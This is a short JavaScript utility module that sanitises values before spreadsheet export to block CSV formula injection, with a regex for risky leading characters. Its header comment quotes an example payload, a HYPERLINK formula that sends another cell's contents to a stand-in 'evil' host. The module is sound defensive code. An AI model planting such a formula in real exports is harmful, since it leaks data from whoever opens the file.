/**
 * Shared helpers to neutralise CSV / spreadsheet formula injection (CWE-1236).
 *
 * When a cell value starts with =, +, -, @, CR or TAB, Excel / LibreOffice /
 * Google Sheets will interpret it as a formula — an attacker could stuff
 * `=HYPERLINK("http://evil/?c="&A1,"Click")` into a free-text field and leak
 * the row's other columns when an admin opens the export.
 *
 * Safe fix: prepend a single quote so the spreadsheet engine renders the cell
 * as literal text. Strings only — numbers / dates are never treated as
 * formulas and must NOT be touched (prepending `'` would stringify them and
 * break downstream sorting).
 */
const DANGEROUS = /^[=+\-@\t\r]/;

const safeCell = (v) => {
  if (v == null) return v;
  if (typeof v !== 'string') return v;
  return DANGEROUS.test(v) ? `'${v}` : v;
};

// Recursively sanitise an object — used before json_to_sheet / aoa_to_sheet.
const safeRow = (row) => {
  if (Array.isArray(row)) return row.map(safeCell);
  if (row && typeof row === 'object') {
    const clean = {};
    for (const [k, v] of Object.entries(row)) clean[k] = safeCell(v);
    return clean;
  }
  return safeCell(row);
};

const safeRows = (rows) => rows.map(safeRow);

module.exports = { safeCell, safeRow, safeRows };
